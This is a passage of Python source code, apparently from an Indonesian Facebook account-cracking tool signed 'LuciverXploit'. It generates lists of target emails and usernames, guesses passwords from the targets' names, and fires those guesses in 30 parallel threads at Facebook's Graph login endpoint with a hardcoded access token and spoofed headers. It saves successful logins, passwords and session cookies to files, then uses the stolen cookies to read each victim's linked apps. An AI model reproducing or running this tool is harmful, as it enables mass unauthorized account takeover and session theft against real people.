		except:pass	
	def Dump_File_Bokep_Bocil_Sd(self,lok):
		try:
			file = open(lok,"r").read().splitlines()
			for z in file:
				ngumpulken_tai_munding.append(z)
		except:pass	
	def Dump_Email_Tersakiti_Luciver(self,nama,format,limit):
		try:
			for z in range(int(limit)):
				if len(nama.split()) > 1:
					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"✘"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					email = str(nama)+str(z)+str(format)+"✘"+str(nama)
				if email in ngumpulken_tai_munding:pass
				else:ngumpulken_tai_munding.append(email)
		except:pass	
	def Dump_Username_Musuh_Kamu(self,nama,limit):
		try:
			for z in range(int(limit)):
				if "." in nama:
					user = str(nama)+"."+str(z)+"✘"+str(nama.replace("."," "))
				else:
					user = str(nama)+"."+str(z)+"✘"+str(nama)
				if user in ngumpulken_tai_munding:pass
				else:ngumpulken_tai_munding.append(user)
		except:pass
class Crack:	
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")	
	def atur_sandi_biar_ganteng_kek_gua(self):
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""            {BODAS}Total {len(ngumpulken_tai_munding)} id""",width=80,padding=(0,21),style=f"bold white"))
		Cie_Kamu_Pusing_Yah = []
	#	bang = []
		self.menu = Console()
		self.tol = Console()
		Cie_Kamu_Pusing_Yah.append(Panel(f'{HEJO}    ➢ • {BODAS}Ingin Manual Ketik\n            [{HEJO}Y {BODAS}atau {HEJO}y {BODAS}]',width=40,padding=(0,2),title=f"{HEJO}Manual",style=f"bold white"))
		Cie_Kamu_Pusing_Yah.append(Panel(f'{HEJO}    ➢ • {BODAS}Ingin Otomatis Ketik\n            {BODAS}[{BEREM}N {BODAS}atau {BEREM}n {BODAS}]',width=40,padding=(0,2),title=f"{HEJO}Otomatis",style=f"bold white"))
		self.menu.print(Columns(Cie_Kamu_Pusing_Yah))
		Bang_Luci = console.input(f" {HEJO}➢ {BODAS}Pilih : ")		
		if Bang_Luci in["Y","y"]:
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"bold white"))
			pwx = console.input(f" {HEJO}• {BODAS}buat katasandi : ").split(",")
			if len(pwx)<=5:
				Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BEREM}katasandi harus minimal 6 huruf""",width=80,style=f"bold white"))
				exit()
			Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"bold white"))
			Ngentod_Dulu_Ah = console.input(f" {HEJO}• {BODAS}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if Ngentod_Dulu_Ah in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.manual_hela_atuh(pwx)		
		else:
			Kalau_Ngga_Bisa_Ganti_Jangan_Ganti = []
		#	bang = []
			self.menu = Console()
			self.tol = Console()
			Kalau_Ngga_Bisa_Ganti_Jangan_Ganti.append(Panel(f'{HEJO}➢ • {BODAS}Online [ {HEJO}Y{BODAS} ]\n{HEJO}➢ • {BODAS}Offline [ {BEREM}N {BODAS}]',width=40,padding=(0,2),title=f"{HEJO}Setting Apk",style=f"bold white"))
			self.menu.print(Columns(Kalau_Ngga_Bisa_Ganti_Jangan_Ganti))
			bool_sia_gening_hideng = console.input(f" {HEJO}➢ {BODAS}Pilih : ")
			if bool_sia_gening_hideng in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis_sayang()	
	def manual_hela_atuh(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(ngumpulken_tai_munding))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpen_hasil_ngarah_benghar()
				for data in ngumpulken_tai_munding:
					user = data.split("✘")[0]
					nama = data.split("✘")[1]
					pwx = pw
					fall.submit(self.metode_ngentot_bool_hayam,user,pwx)
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}berhasil crack total {len(ngumpulken_tai_munding)} id, dengan hasil OK : {HEJO}{len(self.ok)}{BODAS} CP : {KONENG}{len(self.cp)}{BODAS}""",width=80,padding=(0,8),style=f"bold white"))
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{HEJO}➢ •{BODAS}Gagal {BEREM}Cinta {BODAS}Karna Cita²Itu {HEJO}Wajar{BODAS},Gagal Cita² Karna Cinta Itu Kurang {BEREM}Ajar""",width=40,padding=(0,10),title=f"{HEJO} • Quotes LuciverXploit • ",style=f"bold white"))
		sys.exit()	
	def otomatis_sayang(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(ngumpulken_tai_munding))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as Naen_Sia_Anjing:
				self.simpen_hasil_ngarah_benghar()
				for data in ngumpulken_tai_munding:
					try:
						pwx = []
						user = data.split("✘")[0]
						nama = data.split("✘")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
								pwx.append(depan+"123456")
								pwx.append(depan+"321")
								pwx.append(belakang+depan)
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
								pwx.append(depan+"321")
								pwx.append(belakang+depan)
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+" 1234") 
								pwx.append(belakang+"12345")
								pwx.append(belakang+depan)
						Naen_Sia_Anjing.submit(self.metode_ngentot_bool_hayam,user,pwx)
					except:
						Naen_Sia_Anjing.submit(self.metode_ngentot_bool_hayam,user,pwx)
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}berhasil crack total {len(ngumpulken_tai_munding)} id, dengan hasil OK : {HEJO}{len(self.ok)}{BODAS} CP : {KONENG}{len(self.cp)}{BODAS}""",width=80,padding=(0,8),style=f"bold white"))
		sys.exit()				
	def metode_ngentot_bool_hayam(self,email,pwx):
		prog.update(des,description=f" {HEJO}LUCIVERX1{BODAS}{HEJO}STABIL{BODAS} {str(self.loop)}/{len(ngumpulken_tai_munding)} OK : {HEJO}{len(self.ok)}{BODAS} CP : {KONENG}{len(self.cp)}{BODAS}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				Si_Anjing_Recode = random.choice(Aku_Ayah_Luciana)
				params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": Si_Anjing_Recode,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					user = re.findall("c_user=(\d+)",cookie)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						if "muncul" in self.apk:
							self.ngechek_game_bisi_ayaan_guys(user,pw,cookie)
						else:
							Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{HEJO}         SUKSES LOGIN""",width=30,style=f"bold white"))
							tree = Tree(Panel.fit(f"""{HEJO}➢ • User ID  : {user}\n➢ • Password : {pw}{BODAS}""",title=f"{HEJO} • Hasil • ",width=40,style=f"bold white"),guide_style="bold grey100")
							tree.add(Panel(f"{HEJO}{cookie}{BODAS}",title=f"{HEJO} • Cookie • ",style=f"bold white"))
							tree.add(Panel(f"{HEJO}{Si_Anjing_Recode}{BODAS}",title=f"{HEJO} • User Agent • ",style=f"bold white"))
							Recode_Mulu_Bang_Kasihan_Author(tree)
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{BODAS}          BUG LOGIN""",width=30,style=f"bold white"))
						tree = Tree(Panel.fit(f"""{HEJO}➢ • {BODAS}User ID  : {HEJO}{user}\n{HEJO}➢ • {BODAS}Password : {HEJO}{pw}{BODAS}""",width=40,title=f"{HEJO} • Hasil • ",style=f"bold white"),guide_style="bold grey100")
						tree.add(Panel(f"{HEJO}{Si_Anjing_Recode}{BODAS}",title=f"{HEJO} • User Agent • ",style=f"bold white"))
						Recode_Mulu_Bang_Kasihan_Author(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {HEJO}•{BODAS} crack {BEREM}spam{BODAS} {str(self.loop)}/{len(ngumpulken_tai_munding)} OK : {HEJO}{len(self.ok)}{BODAS} CP : {KONENG}{len(self.cp)}{BODAS}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_ngentot_bool_hayam(user,pwx)
		self.loop +=1		
	def simpen_hasil_ngarah_benghar(self):
		Recode_Mulu_Bang_Kasihan_Author(Panel(f"""{HEJO}➢ •{HEJO}OK/{self.hari_ini}.txt\n{HEJO}➢ •{KONENG}CP/{self.hari_ini}.txt""",width=70,padding=(0,10),style=f"bold white"))	
	def ngechek_game_bisi_ayaan_guys(self,user,pw,cookie):		
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass		
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apk_hirup("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{BODAS}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{HEJO}{apk}{BODAS}")		
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apk_modar_uy_karunya("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{BODAS}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{BEREM}{apk}{BODAS}")		
		tree = Tree(Panel.fit(f"""{HEJO}{user}|{pw}{BODAS}""",style=f"bold white"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{HEJO}{cookie}{BODAS}",style=f"bold white"))
		Recode_Mulu_Bang_Kasihan_Author(tree)	
	def apk_hirup(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apk_hirup(next,cookie)
		except:pass	
	def apk_modar_uy_karunya(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apk_modar_uy_karunya(next,cookie)
		except:pass		
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()

#Sc ini LuciverXploit 